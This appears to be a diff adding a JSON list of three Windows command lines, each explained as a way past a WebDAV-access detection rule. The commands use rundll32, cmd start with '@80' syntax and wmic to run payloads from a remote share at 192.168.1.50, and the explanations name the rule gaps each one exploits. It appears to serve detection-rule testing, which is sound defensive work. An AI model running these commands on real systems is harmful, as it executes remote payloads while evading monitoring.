@@ -1,0 +1,14 @@
+[
+  {
+    "output": "rundll32.exe \\\\192.168.1.50\\DavWWWRoot\\share\\payload.dll,EntryPoint",
+    "explanation": "Bypasses the rule because 'rundll32.exe' is not included in the detection's hardcoded list of target processes (Image), while still accessing a file over WebDAV."
+  },
+  {
+    "output": "cmd.exe /c start \\\\192.168.1.50@80\\share\\payload.lnk",
+    "explanation": "Bypasses the rule by avoiding the specific '\\DavWWWRoot\\' string in the CommandLine. Attackers can use the '@80' or '@SSL' WebClient syntax to access WebDAV without triggering the exact string match."
+  },
+  {
+    "output": "wmic.exe process call create \"\\\\192.168.1.50\\DavWWWRoot\\share\\payload.exe\"",
+    "explanation": "Bypasses the rule because the parent process is 'WmiPrvSE.exe' (or similar) rather than 'explorer.exe', and 'wmic.exe' is missing from the targeted Image list."
+  }
+]
